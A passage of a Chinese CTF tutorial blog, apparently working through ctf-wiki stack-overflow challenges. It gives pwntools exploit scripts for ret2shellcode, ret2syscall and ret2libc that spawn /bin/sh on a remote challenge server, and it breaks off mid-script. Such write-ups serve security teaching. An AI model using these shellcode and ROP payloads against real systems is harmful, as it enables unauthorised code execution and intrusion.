&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">shellcode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;]&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">drop&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># print(buf_addr)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">24&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf_addr&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">shellcode&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 32是24字节的填充数据长度加返回地址长度24+8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span> &lt;span class="n">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ret2syscall">ret2syscall&lt;/h3>
&lt;p>控制程序执行系统调用&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener"
>ret2syscall&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407152204.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407152706.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>相对ebp的偏移为0x64=108 覆盖范围为+4=112&lt;/p>
&lt;p>没法ret2text,也没法ret2shellcode&lt;/p>
&lt;p>只有使用系统调用来getshell。执行 int 0x80即可执行对应的系统调用&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">execve(&amp;#34;/bin/sh&amp;#34;,NULL,NULL)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用ROPgadget寻找gadgets&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407155958.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>这样就能够控制到eax,ebx,ecx,edx寄存器。&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407160123.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407160710.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>写payload:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#coding:utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># context(log_level = &amp;#39;debug&amp;#39;,arch =&amp;#39;i386&amp;#39;,os = &amp;#39;linux&amp;#39; )&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = process(./ret2syscall)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10004&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_eax_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x080bb196&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_ebcdx_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0806eb90&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">int_0x80_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08049421&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bin_sh_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x080BE408&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pop_eax_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pop_ebcdx_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">bin_sh_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">int_0x80_addr&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ret2libc">ret2libc&lt;/h3>
&lt;p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。&lt;/p>
&lt;p>eg1: &lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="noopener"
>ret2libc1&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407175007.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">envp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [esp+1Ch] [ebp-64h]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setvbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setvbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_bss_start&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;RET2LIBC &amp;gt;_&amp;lt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">gets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407175502.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407175715.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>exp1:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = process(&amp;#39;./ret2libc1&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10006&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">binsh_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08048720&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sym_plt_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08048460&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">sym_plt_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">binsh_addr&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># &amp;#39;bbbb&amp;#39; 作为函数调用栈返回地址的虚假的地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;hr>
&lt;p>eg2:&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="noopener"
>ret2libc2&lt;/a>&lt;/p>
&lt;p>缺少/bin/sh 只能自己寻找gadgets来进行构造。&lt;/p>
&lt;p>exp:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = process(&amp;#39;./ret2libc2&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10007&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># binsh_addr = 0x08048720&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sym_plt_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08048490&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sym_imp_gets_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08048460&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_ebx_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0804872f&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf2_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x804a080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">sym_imp_gets_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pop_ebx_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">buf2_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">sym_plt_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;x&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">buf2_addr&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>eg3:&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank" rel="noopener"
>ret2libc3&lt;/a>&lt;/p>
&lt;p>2的基础上去掉了system的地址。&lt;/p>
&lt;p>got 表泄露libc的函数地址&lt;/p>
&lt;p>利用思路：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>泄露 __libc_start_main 地址&lt;/p>
&lt;/li>
&lt;li>
&lt;p>获取 libc 版本&lt;/p>
&lt;/li>
&lt;li>
&lt;p>获取 system 地址与 /bin/sh 的地址&lt;/p>
&lt;/li>
&lt;li>
&lt;p>再次执行源程序&lt;/p>
&lt;/li>
&lt;li>
&lt;p>触发栈溢出执行 system(‘/bin/sh’)&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>exp:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">LibcSearcher&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">LibcSearcher&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">log_level&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;debug&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">arch&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;i386&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">os&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;linux&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = process(&amp;#39;./ret2libc3&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10008&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">elf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./ret2libc3&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_plt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">start_main_got&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;__libc_start_main&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">main&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;main&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">puts_plt&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">main&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">start_main_got&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Can you find it !?&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_start_main_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">])&lt;/span>
